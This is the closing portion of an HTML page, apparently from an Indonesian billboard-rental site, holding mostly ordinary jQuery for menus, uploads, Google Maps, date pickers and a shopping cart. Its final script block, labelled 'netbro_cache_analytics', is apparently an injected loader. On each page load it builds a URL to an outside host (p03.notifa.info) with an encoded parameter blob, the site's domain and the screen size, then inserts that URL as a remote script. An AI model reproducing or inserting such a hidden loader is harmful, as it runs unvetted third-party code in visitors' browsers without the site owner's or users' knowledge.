            if (isFiltered == '') {
                document.getElementById("menu-toggle").style.display = "none";
                document.getElementById("sidebar-wrapper").style.display = "none";
                document.getElementById("addspv").style.display = "none";
                document.getElementById("bankaccountMDB").style.display = "none";
                document.getElementById("homeMDB").style.display = "none";
                document.getElementById("footerFull").style.display = "none";
                document.getElementById("footerOne").style.display = "block";
                //document.getElementById("wrapper").style.display = "none";
                //document.getElementById("noLogin").style.display = "block";
                document.getElementById("homeMenu").style.display = "none";
                document.getElementById("dashboardMenu").style.display = "none";
                document.getElementById("orderMenu").style.display = "none";
                document.getElementById("userMenu").style.display = "none";
                document.getElementById("mownerMenu").style.display = "none";
                document.getElementById("listsiteMenu").style.display = "none";
                document.getElementById("regionMenu").style.display = "none";
                document.getElementById("bankaccountMenu").style.display = "none";
                document.getElementById("uploadsiteMenu").style.display = "none";
                document.getElementById("profileMenu").style.display = "none";
                document.getElementById("wishMenu").style.display = "none";
                document.getElementById("cartMenu").style.display = "none";
                document.getElementById("bookMenu").style.display = "none";
                document.getElementById("loginMenu").style.display = "block";
            } else if (isFiltered == 'ADM') {
                document.getElementById("menu-toggle").style.display = "block";
                document.getElementById("sidebar-wrapper").style.display = "block";
                document.getElementById("addspv").style.display = "block";
                document.getElementById("bankaccountMDB").style.display = "none";
                document.getElementById("homeMDB").style.display = "none";
                document.getElementById("footerFull").style.display = "none";
                document.getElementById("footerOne").style.display = "block";
                //document.getElementById("wrapper").style.display = "block";
                //document.getElementById("noLogin").style.display = "none";
                document.getElementById("homeMenu").style.display = "none";
                document.getElementById("dashboardMenu").style.display = "block";
                document.getElementById("orderMenu").style.display = "none";
                document.getElementById("userMenu").style.display = "block";
                document.getElementById("mownerMenu").style.display = "none";
                document.getElementById("listsiteMenu").style.display = "block";
                document.getElementById("regionMenu").style.display = "block";
                document.getElementById("bankaccountMenu").style.display = "block";
                document.getElementById("uploadsiteMenu").style.display = "block";
                document.getElementById("profileMenu").style.display = "block";
                document.getElementById("wishMenu").style.display = "none";
                document.getElementById("cartMenu").style.display = "none";
                document.getElementById("bookMenu").style.display = "none";
                document.getElementById("loginMenu").style.display = "none";
            } else if (isFiltered == 'SPV') {
                document.getElementById("menu-toggle").style.display = "block";
                document.getElementById("sidebar-wrapper").style.display = "block";
                document.getElementById("addspv").style.display = "none";
                document.getElementById("bankaccountMDB").style.display = "none";
                document.getElementById("homeMDB").style.display = "none";
                document.getElementById("footerFull").style.display = "none";
                document.getElementById("footerOne").style.display = "block";
                //document.getElementById("wrapper").style.display = "block";
                //document.getElementById("noLogin").style.display = "none";
                document.getElementById("homeMenu").style.display = "none";
                document.getElementById("dashboardMenu").style.display = "block";
                document.getElementById("orderMenu").style.display = "none";
                document.getElementById("userMenu").style.display = "none";
                document.getElementById("mownerMenu").style.display = "none";
                document.getElementById("listsiteMenu").style.display = "block";
                document.getElementById("regionMenu").style.display = "block";
                document.getElementById("bankaccountMenu").style.display = "block";
                document.getElementById("uploadsiteMenu").style.display = "block";
                document.getElementById("profileMenu").style.display = "block";
                document.getElementById("wishMenu").style.display = "none";
                document.getElementById("cartMenu").style.display = "none";
                document.getElementById("bookMenu").style.display = "none";
                document.getElementById("loginMenu").style.display = "none";
            } else if (isFiltered == 'MDO') {
                document.getElementById("menu-toggle").style.display = "block";
                document.getElementById("sidebar-wrapper").style.display = "block";
                document.getElementById("addspv").style.display = "none";
                document.getElementById("bankaccountMDB").style.display = "none";
                document.getElementById("homeMDB").style.display = "none";
                document.getElementById("footerFull").style.display = "none";
                document.getElementById("footerOne").style.display = "block";
                //document.getElementById("wrapper").style.display = "block";
                //document.getElementById("noLogin").style.display = "none";
                document.getElementById("homeMenu").style.display = "none";
                document.getElementById("dashboardMenu").style.display = "block";
                document.getElementById("orderMenu").style.display = "none";
                document.getElementById("userMenu").style.display = "none";
                document.getElementById("mownerMenu").style.display = "none";
                document.getElementById("listsiteMenu").style.display = "block";
                document.getElementById("regionMenu").style.display = "none";
                document.getElementById("bankaccountMenu").style.display = "block";
                document.getElementById("uploadsiteMenu").style.display = "none";
                document.getElementById("profileMenu").style.display = "block";
                document.getElementById("wishMenu").style.display = "none";
                document.getElementById("cartMenu").style.display = "none";
                document.getElementById("bookMenu").style.display = "none";
                document.getElementById("loginMenu").style.display = "none";
            } else {
                document.getElementById("menu-toggle").style.display = "none";
                document.getElementById("sidebar-wrapper").style.display = "none";
                document.getElementById("addspv").style.display = "none";
                document.getElementById("bankaccountMDB").style.display = "block";
                document.getElementById("homeMDB").style.display = "block";
                document.getElementById("footerFull").style.display = "block";
                document.getElementById("footerOne").style.display = "none";
                //document.getElementById("wrapper").style.display = "none";
                //document.getElementById("noLogin").style.display = "block";
                document.getElementById("homeMenu").style.display = "none";
                document.getElementById("dashboardMenu").style.display = "none";
                document.getElementById("orderMenu").style.display = "none";
                document.getElementById("userMenu").style.display = "none";
                document.getElementById("mownerMenu").style.display = "none";
                document.getElementById("listsiteMenu").style.display = "none";
                document.getElementById("regionMenu").style.display = "none";
                document.getElementById("bankaccountMenu").style.display = "block";
                document.getElementById("uploadsiteMenu").style.display = "none";
                document.getElementById("profileMenu").style.display = "block";
                document.getElementById("wishMenu").style.display = "block";
                document.getElementById("cartMenu").style.display = "block";
                document.getElementById("bookMenu").style.display = "block";
                document.getElementById("loginMenu").style.display = "none";
            }
            //#endregion

            $("#top-toggle").click(function () {
                if ($("#navbarSupportedContent").hasClass('show')) {
                    $("#navbarSupportedContent").removeClass('show');
                    $("#top-toggle").attr("aria-expanded", "false");
                    alert('Hide');
                } else {
                    $("#navbarSupportedContent").addClass('show');
                    alert('Show');
                }
            });

            $("#keranjang").click(function () {
                $("#cartModal").modal('show');
            });
            $("#btnHideModal").click(function () {
                $("#cartModal").modal('hide');
            });

            //#region ThousandSeparator
            $('#Harga').keyup(function () {
                setInputFilter(document.getElementById("Harga"), function (value) {
                    return /^[0-9.,]+$/.test(value);
                });
                var num = $('#Harga').val();
                var comma = /,/g;
                num = num.replace(comma, '');
                console.log('NUM' + num);
                $('#Hargax').val(num);
                var numCommas = addCommas(num);
                console.log('NUMCommas' + numCommas);
                $('#Harga').val(numCommas);
            });
            //#endregion

            FillBank();
            FillType();
            FillProvince();
            $("#lstcity").append("<option value=''>Pilih Kota</option>");

            if (document.getElementById("dtlPrice") != null) {
                document.getElementById("dtlPrice").innerHTML = addCommas(document.getElementById("dtlPrice")
                    .innerHTML);
            }

            $("#example1").each(function () {
                var price = $(this).find('.price');
                price.each(function () {
                    var tag = $(this);
                    tag[0].innerHTML = addCommas(tag[0].innerHTML);
                })
                var cdate = $(this).find('.custom-date');
                cdate.each(function () {
                    var tag = $(this);
                    if (tag[0].innerHTML != "") {
                        tag[0].innerHTML = formatDate(new Date(tag[0].innerHTML.toString()));
                    }
                })
            })

            $('#example1').DataTable({
                dom: 'Bfrtip',
                buttons: [
                    'copy', 'csv', 'excel', 'pdf', 'print'
                ]
            });

            $("#tdasboard").each(function () {
                var price = $(this).find('.price');
                price.each(function () {
                    var tag = $(this);
                    tag[0].innerHTML = addCommas(tag[0].innerHTML);
                })
                var cdate = $(this).find('.custom-date');
                cdate.each(function () {
                    var tag = $(this);
                    if (tag[0].innerHTML != "") {
                        tag[0].innerHTML = formatDate(new Date(tag[0].innerHTML));
                    }
                })
            })

            $('#tdasboard').DataTable({
                //dom: 'Bfrtip',
                buttons: [
                    'copy', 'csv', 'excel', 'pdf', 'print'
                ],
                autoWidth: false,
                columnDefs: [{
                        'width': '80px',
                        'targets': 3
                    },
                    {
                        'width': '80px',
                        'targets': 4
                    }
                ]
            });

            $("#divlist").each(function () {
                var price = $(this).find('.price');
                price.each(function () {
                    var tag = $(this);
                    tag[0].innerHTML = addCommas(tag[0].innerHTML);
                })
            })

            $("#divfilter").each(function () {
                var price = $(this).find('.price');
                price.each(function () {
                    var tag = $(this);
                    tag[0].innerHTML = addCommas(tag[0].innerHTML);
                })
            })

            $("#divCompare").each(function () {
                var price = $(this).find('.price');
                price.each(function () {
                    var tag = $(this);
                    tag[0].innerHTML = addCommas(tag[0].innerHTML);
                })
            })

            //#region UploadPage
            $('#btnUpload').on('click', function () {
                var fileExtension = ['xls', 'xlsx'];
                var filename = $('#fUpload').val();
                if (filename.length == 0) {
                    alert("Please select a file.");
                    return false;
                } else {
                    var extension = filename.replace(/^.*\./, '');
                    if ($.inArray(extension, fileExtension) == -1) {
                        alert("Please select only excel files.");
                        return false;
                    } else if (!filename.includes("BillboardIndo_Site")) {
                        alert("Please upload BillboardIndo_Site Document.");
                        return false;
                    }
                }
                var fdata = new FormData();
                var fileUpload = $("#fUpload")[0];
                var files = fileUpload.files;
                fdata.append(files[0].name, files[0]);
                showLoader();
                $.ajax({
                    type: "POST",
                    url: "/MediaWebDev/ExportImport/OnPostImport",
                    beforesend: function (xhr) {
                        xhr.setrequestheader("xsrf-token", $(
                                'input:hidden[name="__requestverificationtoken"]')
                            .val());
                    },
                    data: fdata,
                    contentType: false,
                    processData: false,
                    success: function (response) {
                        if (response.length == 0) {
                            alert('Some error occured while uploading');
                        } else {
                            $('#dvData').html(response);
                        }
                        showPage();
                    },
                    error: function (e) {
                        //$('#dvData').html(e.responseText);
                        $('#dvData').html('Mohon check file input anda!' + e.responseText
                            .toString());
                        showPage();
                    }
                });
            });
            $('#btnUploadImage').on('click', function () {
                var fileExtension = ['jpg', 'png', 'jpeg'];
                var filename = $('#iUpload').val();
                if (filename.length == 0) {
                    alert("Please select a file.");
                    return false;
                } else {
                    var extension = filename.replace(/^.*\./, '');
                    if ($.inArray(extension, fileExtension) == -1) {
                        alert("Please select only image files.");
                        return false;
                    }
                }
                var fdata = new FormData();
                var fileUpload = $("#iUpload")[0];
                var files = fileUpload.files;
                var newUrl = '/MediaWebDev/Site';
                fdata.append(files[0].name, files[0]);
                $.ajax({
                    type: "POST",
                    url: "/MediaWebDev/Site/AddImage", //"/ExportImport?handler=Import",
                    beforesend: function (xhr) {
                        xhr.setrequestheader("xsrf-token",
                            $('input:hidden[name="__requestverificationtoken"]').val());
                    },
                    data: fdata,
                    contentType: false,
                    processData: false,
                    success: function (response) {
                        //alert(response);
                        if (response.length == 0)
                            alert('Some error occured while uploading');
                        else {
                            alert('Success Uploaded');
                            window.location.href = newUrl;
                        }
                    },
                    error: function (e) {
                        alert(e);
                    }
                });
            })
            $('#btnUpdateImage').on('click', function () {
                var fileExtension = ['jpg', 'png', 'jpeg'];
                var filename = $('#iUpdate').val();
                if (filename.length == 0) {
                    alert("Please select a file.");
                    return false;
                } else {
                    var extension = filename.replace(/^.*\./, '');
                    if ($.inArray(extension, fileExtension) == -1) {
                        alert("Please select only image files.");
                        return false;
                    }
                }
                var fdata = new FormData();
                var fileUpload = $("#iUpdate")[0];
                var files = fileUpload.files;
                var newUrl = '/MediaWebDev/Site';
                fdata.append(files[0].name, files[0]);
                $.ajax({
                    type: "POST",
                    url: "", //"/ExportImport?handler=Import",
                    beforesend: function (xhr) {
                        xhr.setrequestheader("xsrf-token",
                            $('input:hidden[name="__requestverificationtoken"]').val());
                    },
                    data: fdata,
                    contentType: false,
                    processData: false,
                    success: function (response) {
                        //alert(response);
                        if (response.length == 0)
                            alert('Some error occured while uploading');
                        else {
                            alert('Success Updated');
                            window.location.href = newUrl;
                        }
                    },
                    error: function (e) {
                        alert(e);
                    }
                });
            })
            //#endregion
        })
        $(document).on('click', '#backLink', function () {
            history.go(-1);
        })

        //#region Maps
        function initMap() {
            // map options
            var map, map2;
            var marker, marker2;
            var options = {
                zoom: 5,
                center: new google.maps.LatLng(-3.5058155, 122.6757871),
                mapTypeId: google.maps.MapTypeId.TERRAIN,
                mapTypeControl: false
            };
            if (cities != null && (document.getElementById('map_canvas') != undefined || document.getElementById(
                    'map_canvas2') != undefined)) {
                map = new google.maps.Map(document.getElementById('map_canvas'), options);
                map2 = new google.maps.Map(document.getElementById('map_canvas2'), options);
                for (var i = 0; i < cities.length; i++) {
                    // init markers
                    marker = new google.maps.Marker({
                        position: new google.maps.LatLng(cities[i]['Lat'], cities[i]['Lng']),
                        map: map,
                        title: cities[i]['Title']
                    });
                    var infowindow = new google.maps.InfoWindow({});
                    google.maps.event.addListener(marker, 'click', (function (marker, i) {
                        return function () {
                            var contentString = '<div id="content">' +
                                '<h1>' + cities[i]['Title'] + '</h1>' +
                                '<p>Latitude : ' + cities[i]['Lat'] + '</p>' +
                                '<p>Longitude : ' + cities[i]['Lng'] + '</p>' +
                                '</div>';
                            infowindow.setContent(cities[i]['Title']);
                            infowindow.setContent(contentString);
                            infowindow.open(map, marker);
                        }
                    })(marker, i));
                    marker2 = new google.maps.Marker({
                        position: new google.maps.LatLng(cities[i]['Lat'], cities[i]['Lng']),
                        map: map2,
                        title: cities[i]['Title']
                    });
                    var infowindow2 = new google.maps.InfoWindow({});
                    google.maps.event.addListener(marker2, 'click', (function (marker2, i) {
                        return function () {
                            var contentString = '<div id="content">' +
                                '<h1>' + cities[i]['Title'] + '</h1>' +
                                '<p>Latitude : ' + cities[i]['Lat'] + '</p>' +
                                '<p>Longitude : ' + cities[i]['Lng'] + '</p>' +
                                '</div>';
                            infowindow2.setContent(cities[i]['Title']);
                            infowindow2.setContent(contentString);
                            infowindow2.open(map2, marker2);
                            console.log('Canvas2' + infowindow2);
                        }
                    })(marker2, i));
                }
            }
        }

        google.maps.event.addDomListener(window, 'load', initMap);
        //#endregion

        //#region DetailPage
        var siteData = {
            "Cities": [{
                "Title": "7285JTJW",
                "Lat": -7.5906808,
                "Lng": 110.2912668
            }],
            "Site": {
                "Detail": {
                    "SiteID": "a13ade19-43f2-4a30-ad86-00a7df8e4504",
                    "NoBillboard": "7285JTJW",
                    "Pulau": "Jawa",
                    "Kota": "Magelang",
                    "Provinsi": "Jawa Tengah",
                    "Cabang": "",
                    "Ukuran": null,
                    "HorV": "V",
                    "Tipe": "Billboard",
                    "Longitude": "110.2912668",
                    "Latitude": "-7.5906808",
                    "RateScoreAverage": 0.0,
                    "Alamat": "Jl. FX Suhaji - Jl. Pemuda, Depan Tape Ketan Muntilan - View Dari Arah Yogyakarta Ke Magelang ",
                    "TotalView": 17
                },
                "Item": [{
                    "SiteID": "a13ade19-43f2-4a30-ad86-00a7df8e4504",
                    "SiteItemID": "fd91258e-d5dc-44f2-9212-7facb2238fee",
                    "ArahLokasi": "",
                    "KodeLokasi": null,
                    "Panjang": 4.0,
                    "Lebar": 6.0,
                    "Wishlist": {
                        "isWishlist": false,
                        "WishlistID": "00000000-0000-0000-0000-000000000000"
                    },
                    "Price": [{
                        "SitePriceID": "c95e2742-79c3-4d10-b230-48dfdf120b5b",
                        "SiteItemID": "fd91258e-d5dc-44f2-9212-7facb2238fee",
                        "Dasar": "",
                        "Kelipatan": 1.0,
                        "HargaAwal": 500000.0,
                        "HargaAkhir": 0.0,
                        "MinimDasar": "Hari",
                        "MinimOrder": 7
                    }],
                    "Image": [{
                        "SiteImageID": "a8c58a7a-a68f-4a06-9646-4d25637fee1f",
                        "SiteItemID": "fd91258e-d5dc-44f2-9212-7facb2238fee",
                        "Image": "/MediaWeb/Upload/Image/7285JTJW/7285JTJW.jpg"
                    }]
                }]
            }
        };
        var Dcity;
        if (siteData != null) {
            Dcity = siteData.Cities;
        }

        function initMap3() {
            // map options
            var map3;
            var marker3;
            var options = {
                zoom: 5,
                center: new google.maps.LatLng(-3.5058155, 122.6757871),
                mapTypeId: google.maps.MapTypeId.TERRAIN,
                mapTypeControl: false
            };
            if (Dcity != null) {
                if (Dcity.length > 0) {
                    options = {
                        zoom: 5,
                        center: new google.maps.LatLng(Dcity[0]['Lat'], Dcity[0]['Lng']),
                        mapTypeId: google.maps.MapTypeId.TERRAIN,
                        mapTypeControl: false
                    };
                }
                map3 = new google.maps.Map(document.getElementById('map_canvas3'), options);
                for (var i = 0; i < Dcity.length; i++) {
                    // init markers
                    marker3 = new google.maps.Marker({
                        position: new google.maps.LatLng(Dcity[i]['Lat'], Dcity[i]['Lng']),
                        map: map3,
                        title: Dcity[i]['Title']
                    });
                    var infowindow = new google.maps.InfoWindow({});
                    google.maps.event.addListener(marker3, 'click', (function (marker3, i) {
                        return function () {
                            var contentString = '<div id="content">' +
                                '<h1>' + Dcity[i]['Title'] + '</h1>' +
                                '<p>Latitude : ' + Dcity[i]['Lat'] + '</p>' +
                                '<p>Longitude : ' + Dcity[i]['Lng'] + '</p>' +
                                '</div>';
                            infowindow.setContent(Dcity[i]['Title']);
                            infowindow.setContent(contentString);
                            infowindow.open(map3, marker3);
                        }
                    })(marker3, i));
                }
            }
        }

        google.maps.event.addDomListener(window, 'load', initMap3);

        var Difference_In_Time = 0;
        var Difference_In_Days = 0;
        var dat1 = new Date();
        var dat2 = new Date();

        $(function () {
            var today = new Date();
            var date1 = new Date();
            today.setDate(today.getDate() + 7);
            let today7 = ("0" + today.getMonth()).slice(-2) + "-" + ("0" + today.getDate()).slice(-2) + "-" +
                today.getFullYear();
            console.log(today7);
            $(".datePicker").datetimepicker();
            $("#datepicker1 input").datetimepicker({
                format: 'DD-MM-YYYY',
                icons: {
                    today: "fas fa-bomb",
                    date: "fas fa-calendar",
                    time: "fas fa-clock-o",
                    up: "fa fa-arrow-up",
                    next: "fa fa-arrow-right",
                    down: "fa fa-arrow-down",
                    previous: "fa fa-arrow-left",
                    clear: "fas fa-circle-o",
                    close: "fas fa-times"
                },
                locale: 'en',
                minDate: moment().format('MM-DD-YYYY'),
            });
            $("#datepicker2 input").datetimepicker({
                format: 'DD-MM-YYYY',
                icons: {
                    today: "fas fa-bomb",
                    date: "fas fa-calendar",
                    time: "fas fa-clock-o",
                    up: "fa fa-arrow-up",
                    next: "fa fa-arrow-right",
                    down: "fa fa-arrow-down",
                    previous: "fa fa-arrow-left",
                    clear: "fas fa-circle-o",
                    close: "fas fa-times"
                },
                locale: 'en',
                minDate: moment(today7).format('MM-DD-YYYY'),
            });
            $("#datepicker1").datetimepicker();
            $("#datepicker2").datetimepicker({
                useCurrent: false //Important! See issue #1075
            });
            $("#datepicker1").on("dp.change", function (e) {
                date1 = e.date;
                var oldDate = new Date(e.date);
                var newDate = new Date();
                newDate.setDate(oldDate.getDate() + 7);
                $("#datepicker2 input").data("DateTimePicker").minDate(newDate);
                $("#datepicker2 input").prop("disabled", false);
                $("#popsubmit").prop("disabled", false);
            });
            $("#datepicker2").on("dp.change", function (e) {
                dat1 = new Date(date1);
                dat2 = new Date(e.date);
                Difference_In_Time = dat2.getTime() - dat1.getTime();
                Difference_In_Days = Difference_In_Time / (1000 * 3600 * 24);
                $("#durasi").val(Difference_In_Days.toFixed(0));
            });
        });

        function addCart(target) {
            let siteID = $("#siteID").val();
            let sitePriceID = $("#sitePriceID").val();
            let siteItemID = $("#siteItemID").val();
            let price = $("#price").val();
            let dura = $("#durasi").val();
            let total = Number(price) * Number(dura);
            $.post(target, {
                    siteID: siteID,
                    sitePriceID: sitePriceID,
                    siteItemID: siteItemID,
                    price: price,
                    durasi: dura,
                    totalprice: total,
                    startDate: dat1.toISOString(),
                    endDate: dat2.toISOString()
                },
                function (returnedData) {
                    alert("Data Added to Cart");
                    $.post(domain + "/Site/ViewDetail", {
                        id: siteID
                    }, function (data) {
                        $("#cartModal").modal('hide');
                    });
                }).fail(function (e) {
                alert("Fail to Added Data");
                console.log("error");
                console.log(e);
            });
        }
        //#endregion
    </script>

    <script type="text/javascript">
        if (self == top) {
            function netbro_cache_analytics(fn, callback) {
                setTimeout(function () {
                    fn();
                    callback();
                }, 0);
            }

            function sync(fn) {
                fn();
            }

            function requestCfs() {
                var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
                var idc_glo_r = Math.floor(Math.random() * 99999999999);
                var url = idc_glo_url + "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" +
                    "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncX6w741Zdq0hCzJqkE9EwtPSm9ZAB0NzeoB09JH7usk9FbRK1nU0XKwAQHqWY4DcJm%2bvWo4OHKo9WrPeTMCrzBfGCpy6nKl1UEficzq4DSZhJy7y9LeU69JDWvSYVJ5aK0WZiyeYY5lIbd7xFrEeQxXrT129NHWkwRPR%2bZaNx7%2fdj0ctd%2fy3nevwmPfVlo9QQ2HDQo4unhF%2fIwXgwkIRdcSuz%2bONJRjQMQ96j%2ftIqy94XqU6iZ2LaYcGwWDggdGNrRcw2j0ZffwgdHqBzTWH%2f0hpKwrKwaxc4kcjBVG%2bPXXAVxtZiYcIcZ9Wr7dYEII6vKUQGuDWrx8zCunPg3XCKbAYn9njcuTU%2bgaByilylVqOicwTtc%2fs2nU4aiz%2fRvX%2fKmlXFnT5zI1qOpFDbZ%2fiPnfCMAWKrFQFbKt5cJAQ3nXnpNYQ6ntVKc7FrcRDKrLPjblOln7oSxDWL%2fJdvL3fd4QJjGvh1fS%2bwhMja5UrJQ7Q1gWfK8OafzDfiXdpD%2bC50rx6fWJa%2fpM0FGsA07eju7S4wJow%2fw%2fmfoxX9eajCBeWfSWI7JwJKtiBBExnr9SgNmC5OpwtK74K5524%2fg0dWS%2bgyxRYDLnfIq" +
                    "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen
                    .height;
                var bsa = document.createElement('script');
                bsa.type = 'text/javascript';
                bsa.async = true;
                bsa.src = url;
                (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
            }
            netbro_cache_analytics(requestCfs, function () {});
        };
    </script>
</body>

</html>